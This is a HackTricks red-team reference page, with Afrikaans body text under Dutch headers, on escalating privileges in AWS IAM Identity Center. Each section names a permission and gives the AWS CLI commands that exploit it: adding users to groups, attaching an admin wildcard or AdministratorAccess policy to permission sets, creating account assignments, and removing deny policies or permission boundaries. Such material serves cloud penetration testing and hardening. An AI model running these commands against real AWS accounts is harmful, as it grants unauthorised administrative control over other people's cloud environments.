# AWS - SSO & identiteitswinkel Privesc

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**offici√´le PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## AWS Identity Center / AWS SSO

Vir meer inligting oor AWS Identity Center / AWS SSO, kyk:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Let daarop dat slegs **gebruikers** met toestemmings **vanaf** die **Bestuursrekening** toegang tot en **beheer van die IAM Identity Center** sal h√™ volgens die **standaard**.\
Gebruikers van ander rekeninge kan dit slegs toelaat as die rekening 'n **gedelegeerde administrateur** is.\
[Lees die dokumentasie vir meer inligting.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Herstel wagwoord~~

'n Maklike manier om voorregte in gevalle soos hierdie te verhoog, sou wees om 'n toestemming te h√™ wat dit moontlik maak om gebruikerswagwoorde te herstel. Ongelukkig is dit slegs moontlik om 'n e-pos na die gebruiker te stuur om sy wagwoord te herstel, dus sal jy toegang tot die gebruikers se e-pos benodig.

### `identitystore:CreateGroupMembership`

Met hierdie toestemming is dit moontlik om 'n gebruiker binne 'n groep te plaas sodat hy al die toestemmings van die groep sal erf.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

'n Aanvaller met hierdie toestemming kan ekstra toestemmings verleen aan 'n Toestemmingsset wat aan 'n gebruiker onder sy beheer verleen is. 

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

'n Aanvaller met hierdie toestemming kan ekstra toestemmings verleen aan 'n Toestemmingsset wat aan 'n gebruiker onder sy beheer verleen is.

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

'n Aanvaller met hierdie toestemming kan ekstra toestemmings verleen aan 'n Toestemmingsset wat aan 'n gebruiker onder sy beheer verleen is.

{% hint style="warning" %}
Om hierdie toestemmings in hierdie geval te misbruik, moet jy die **naam van 'n kli√´ntbestuurde beleid ken wat binne ALLE rekeninge** wat geraak gaan word, is.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:CreateAccountAssignment`

'n Aanvaller met hierdie toestemming kan 'n Toestemmingsstel aan 'n gebruiker onder sy beheer gee vir 'n rekening.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

Gee die STS korttermyn-geloofsbriewe vir 'n gegewe rol naam wat aan die gebruiker toegewys is.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Maar jy benodig 'n toegangsteken waarvan ek nie seker is hoe om dit te kry (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

'n Aanvaller met hierdie toestemming kan die koppeling tussen 'n AWS bestuurde beleid en die gespesifiseerde toestemmingsset verwyder. Dit is moontlik om meer voorregte te verleen deur 'n bestuurde beleid (ontkenningbeleid) af te koppel.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

'n Aanvaller met hierdie toestemming kan die koppeling tussen 'n Kli√´ntbestuurde beleid en die gespesifiseerde toestemmingsstel verwyder. Dit is moontlik om meer voorregte te verleen deur 'n bestuurde beleid (ontkenbeleid) af te koppel.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

'n Aanvaller met hierdie toestemming kan die regte van 'n inline-beleid uit die toestemmingsset verwyder. Dit is moontlik om **meer voorregte te verleen deur 'n inline-beleid (ontkenbeleid)** af te koppel.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

'n Aanvaller met hierdie toestemming kan die Toestemmingsgrens van die toestemmingsset verwyder. Dit is moontlik om **meer voorregte te verleen deur die beperkings op die Toestemmingsset** wat deur die Toestemmingsgrens gegee is, te verwyder.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
